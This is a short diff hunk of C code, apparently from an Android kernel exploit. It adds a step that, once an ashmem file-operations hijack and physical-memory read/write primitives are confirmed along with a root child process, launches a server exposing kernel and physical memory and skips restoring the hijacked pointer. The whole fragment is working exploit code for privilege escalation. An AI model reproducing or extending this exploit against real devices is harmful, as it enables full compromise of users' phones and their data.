@@ -855,6 +855,14 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
+  /* SEAM: fops hijack live, physrw armed, root child confirmed.
+   * The server serves kernel-virt + phys memory from THIS process and
+   * never returns; the ashmem fops restore below is therefore skipped. */
+  if (physrw_read64_ok != 0 && physrw_write64_ok != 0) {
+    pr_success("physrw-server launching at seam fd=%d\n", fd);
+    physrw_server_launch(fd, misc_fops, canon_addr(ASHMEM_FOPS));
+  }
+
   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
   ssize_t restore = configfs_write_once(
       fd, misc_fops, &original_fops, sizeof(original_fops));
